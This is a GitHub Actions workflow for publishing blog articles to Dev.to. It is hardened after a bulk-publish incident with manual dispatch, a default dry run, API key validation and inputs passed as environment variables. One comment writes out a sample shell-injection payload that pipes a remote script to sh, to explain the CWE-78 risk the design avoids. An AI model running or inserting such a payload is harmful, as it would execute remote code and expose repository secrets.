name: Publish to Dev.to

# Publishes/updates dev.to articles — MANUAL DISPATCH ONLY.
# The push trigger was removed 2026-07-19 after the Capsule-0 incident: merging
# PR #62 auto-fired a live bulk publish of the whole corpus (cancelled at 6
# articles; see agents/footprint/incident-ledger.md). Dev.to publishing follows
# the controlled-capsule model (covers, arc order, /go/ routing) — fire this
# workflow by hand per capsule. dry_run defaults to true.

on:
  workflow_dispatch:
    inputs:
      dry_run:
        description: "Preview without calling the Dev.to API"
        type: boolean
        default: true
      article:
        description: "Slug to publish. LEAVE EMPTY ONLY IF YOU MEAN THE WHOLE CORPUS."
        type: string
        required: false
        default: ""

concurrency:
  group: publish-devto
  cancel-in-progress: false

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
      - run: npm install --no-audit --no-fund --include=optional
      - name: Validate DEVTO_API_KEY
        env:
          DEVTO_API_KEY: ${{ secrets.DEVTO_API_KEY }}
        run: |
          if [ -z "${DEVTO_API_KEY:-}" ]; then
            echo "::error::DEVTO_API_KEY secret is not set"; exit 1
          fi
          # Non-empty is not the same as VALID, and the difference is the
          # whole failure mode: a rotated or revoked key looks perfectly
          # configured right up until the publish 401s. The eslint repo's
          # key is 401-rejected today, so this is not hypothetical.
          #
          # GET /api/articles/me publishes nothing and costs one request.
          # It runs on dry runs too — the point is to learn the key is dead
          # BEFORE a live dispatch depends on it.
          CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -H "api-key: ${DEVTO_API_KEY}" \
            "https://dev.to/api/articles/me?per_page=1")
          if [ "$CODE" != "200" ]; then
            echo "::error::DEVTO_API_KEY is set but Dev.to rejected it (HTTP $CODE). Rotate the secret; publishing would fail."
            exit 1
          fi
          echo "::notice::DEVTO_API_KEY accepted by Dev.to (HTTP 200)"
      - name: Publish
        env:
          DEVTO_API_KEY: ${{ secrets.DEVTO_API_KEY }}
          # Inputs are staged as ENV, never interpolated into the script body.
          # `${{ inputs.article }}` inline is a shell-injection vector
          # (CWE-78): a dispatch with `; curl evil.sh | sh #` would run in a
          # runner where DEVTO_API_KEY is in scope. The template engine emits
          # a literal assignment here; the shell only ever sees a variable.
          ARTICLE_INPUT: ${{ inputs.article }}
          DRY_RUN: ${{ inputs.dry_run }}
        run: |
          # Targeting one article is the normal case. The publish script has
          # always supported --article; the workflow did not expose it, so the
          # only available action was "publish all 91", which is precisely the
          # Capsule-0 shape this workflow was locked down for. A gate you can
          # only pass by doing the dangerous thing is not a gate.
          if [ -n "$ARTICLE_INPUT" ]; then
            echo "::notice::targeting a single article: $ARTICLE_INPUT"
          else
            echo "::warning::no article given — this run covers the ENTIRE corpus"
          fi

          # Branch on the two shapes rather than building an ARGS string:
          # an unquoted "$ARGS" would word-split a slug containing spaces,
          # which is the same class of bug one layer down.
          if [ "$DRY_RUN" = "true" ]; then
            if [ -n "$ARTICLE_INPUT" ]; then
              node apps/blog/scripts/publish-to-devto.mjs --dry-run --article "$ARTICLE_INPUT"
            else
              node apps/blog/scripts/publish-to-devto.mjs --dry-run
            fi
          else
            if [ -n "$ARTICLE_INPUT" ]; then
              node apps/blog/scripts/publish-to-devto.mjs --article "$ARTICLE_INPUT"
            else
              node apps/blog/scripts/publish-to-devto.mjs
            fi
          fi
